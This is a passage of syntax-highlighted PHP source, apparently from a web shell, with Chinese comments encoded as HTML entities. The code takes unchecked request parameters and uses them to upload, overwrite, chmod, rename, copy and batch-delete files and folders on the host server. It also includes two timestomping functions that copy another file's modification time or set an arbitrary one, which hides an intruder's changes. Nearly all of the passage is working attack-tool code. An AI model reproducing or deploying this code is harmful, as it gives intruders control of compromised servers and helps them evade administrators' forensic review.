<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'File upload '</span>.(<span style="color: #81a2be;">@copy</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_FILES</span>[<span style="color: #8abeb7;">'uploadfile'</span>][<span style="color: #8abeb7;">'tmp_name'</span>],<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">uploaddir</span>.<span style="color: #8abeb7;">'/'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">_FILES</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'uploadfile'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">]) ? </span><span style="color: #8abeb7; text-decoration: underline;">'success'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#32534;&#36753;&#25991;&#20214;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">editfilename</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filecontent</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span> = <span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">editfilename</span>,<span style="color: #8abeb7;">'w'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Save file '</span>.(<span style="color: #81a2be;">@fwrite</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filecontent</span>) ? <span style="color: #8abeb7;">'success'</span> : <span style="color: #8abeb7;">'failed'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#32534;&#36753;&#25991;&#20214;&#23646;&#24615;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pfile</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">newperm</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>file_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pfile</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'The original file does not exist'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">newperm</span> = base_convert(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">newperm</span>,8,10);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Modify file attributes '</span>.(<span style="color: #81a2be;">@chmod</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pfile</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">newperm</span>) ? <span style="color: #8abeb7;">'success'</span> : <span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">failed'</span><span style="text-decoration: underline;">));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#25913;&#21517;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">oldname</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">newfilename</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nname</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">newfilename</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (file_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nname</span>) || <span style="color: #81a2be;">!</span>file_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">oldname</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nname</span>.<span style="color: #8abeb7;">' has already existed or original file does not exist'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(basename(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">oldname</span>).<span style="color: #8abeb7;">' renamed '</span>.basename(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nname</span>).(<span style="color: #81a2be;">@rename</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">oldname</span>,<span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nname</span><span style="text-decoration: underline;">) ? </span><span style="color: #8abeb7; text-decoration: underline;">' success'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#22797;&#21046;&#25991;&#20214;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sname</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tofile</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (file_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tofile</span>) || <span style="color: #81a2be;">!</span>file_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sname</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'The goal file has already existed or original file does not exist</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(basename(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tofile</span>).<span style="color: #8abeb7;">' copied '</span>.(<span style="color: #81a2be;">@copy</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sname</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tofile</span>) ? basename(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">to</span><span style="color: #f0c674; text-decoration: underline;">file</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">' success'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#20811;&#38534;&#26102;&#38388;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curfile</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tarfile</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>@file_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curfile</span>) || <span style="color: #81a2be;">!</span>@file_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tarfile</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'The goal file has already existed or original file does not exist</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">time</span> = <span style="color: #81a2be;">@filemtime</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tarfile</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Modify file the last modified '</span>.(<span style="color: #81a2be;">@touch</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curfile</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">time</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">time</span>) ? <span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">success'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33258;&#23450;&#20041;&#26102;&#38388;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curfile</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">year</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">month</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">day</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">hour</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">minute</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">second</span>) <span style="text-decoration: underline;">{</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>@file_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curfile</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(basename(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curfile</span>).<span style="color: #8abeb7;">' does not exist'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">time</span> = strtotime(<span style="color: #8abeb7;">"</span><span style="color: #f0c674;">$year</span><span style="color: #8abeb7;">-</span><span style="color: #f0c674;">$month</span><span style="color: #8abeb7;">-</span><span style="color: #f0c674;">$day</span><span style="color: #8abeb7;"> </span><span style="color: #f0c674;">$hour</span><span style="color: #8abeb7;">:</span><span style="color: #f0c674;">$minute</span><span style="color: #8abeb7;">:</span><span style="color: #f0c674;">$second</span><span style="color: #8abeb7;">"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Modify file the last modified '</span>.(<span style="color: #81a2be;">@touch</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curfile</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">time</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">time</span>) ? <span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">success'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#25209;&#37327;&#21024;&#38500;&#25991;&#20214;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'delfiles'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dl</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dfiles</span>=<span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">succ</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fail</span> = 0;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dl</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (is_dir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">@deltree</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">succ</span>++;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fail</span>++;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">@unlink</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">succ</span>++;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fail</span>++;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Deleted folder/file have finished,choose '</span>.count(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dl</span>).<span style="color: #8abeb7;">' success '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">succ</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' fail '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">fail</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Please select folder/file(s)'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#25805;&#20316;&#23436;&#27605;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'createdir'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'newdirname'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dir'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'fileperm'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'newperm'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'pfile'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dir'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'copyfile'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'sname'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'tofile'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dir'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'rename'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'oldname'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'newfilename'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dir'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'fileopform'</span>, <span style="color: #8abeb7;">'target'</span>=&gt;<span style="color: #8abeb7;">'_blank'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'opfile'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dir'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'getsize'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'getdir'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dir'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">free</span> = @disk_free_space(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
